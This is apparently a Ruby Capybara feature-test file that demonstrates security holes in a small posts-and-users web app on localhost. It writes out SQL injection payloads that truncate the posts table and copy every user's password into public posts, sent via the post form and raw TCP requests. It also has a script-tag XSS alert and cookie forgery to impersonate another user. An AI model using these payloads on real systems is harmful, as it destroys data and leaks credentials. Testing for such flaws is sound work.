require_relative '../../app/models/post'
require_relative '../../app/models/user'

feature 'injection in posts form', :ignore => true do 
  scenario 'truncating post table' do
    sign_up()
    sign_in()
    visit '/posts'
    make_post("post")
    sleep(0.1)
    make_post("HACK', 1); truncate table posts; --")
    expect(Post.all.empty?).to eq true
  end
  scenario "posting everyones' passwords", :ignore => true do
    sign_up(username: 'user1', password: "appleapple", password_conf: "appleapple")   
    sign_up(username: 'user2', password: "bananabanana", password_conf: "bananabanana")
    sign_up(username: 'user3', password: "lemonlemon", password_conf: "lemonlemon")
    
    sign_up()
    sign_in()
    visit '/posts'
    userid = User.find_first({'username' => 'testuser'}).id
    make_post("HACK', #{userid}); insert into posts(content, user_id) select password, id from users; --")
    sleep 2
    expect(page).to have_content('user1: apple')
    expect(page).to have_content('user2: banana')
    expect(page).to have_content('user3: lemon')
  end
end

feature 'injection in post to /users', :ignore => true do
  scenario 'truncating post table' do
    sign_up
    sign_in
    make_post 'post'
    socket = TCPSocket.new('localhost', 3001)
    socket.print "POST /users \r\n\r\nusername=HACK', 'password'); truncate table posts; --&password=password&password_conf=password"
  
    sleep 0.1
    expect(Post.all.empty?).to eq true
  end
end
feature 'injection in post to /users/signin', :ignore => true do
  scenario 'truncating post table' do
    sign_up
    sign_in
    make_post 'post'
    socket = TCPSocket.new('localhost', 3001)
    socket.print "POST /users/signin \r\n\r\nusername=HACK'; truncate table posts; --&password=password&password_conf=password"
    sleep 0.1
    expect(Post.all.empty?).to eq true
  end
end
feature 'Exploits', :ignore => true do
  scenario('A user can input a malicious post that displays browser alerts') do
    sign_up
    make_post('<script>window.alert("Hello world")</script>')
    sleep(1)
    visit '/posts'
    alert = page.driver.browser.switch_to.alert.text
    expect(alert).to have_content "Hello world"
  end

  scenario 'cookies can be hijacked (via simple javascript manipulation)' do
    sign_up(username: 'victim')
    id = User.find_first({'username' => 'victim'}).id
    click_link 'Sign Out'
    sign_up(username: 'hijacker')
    page.execute_script("document.cookie = 'user-id=#{id}'")
    make_post('Hijacked')
    expect(page).to have_content 'victim'
  end
end
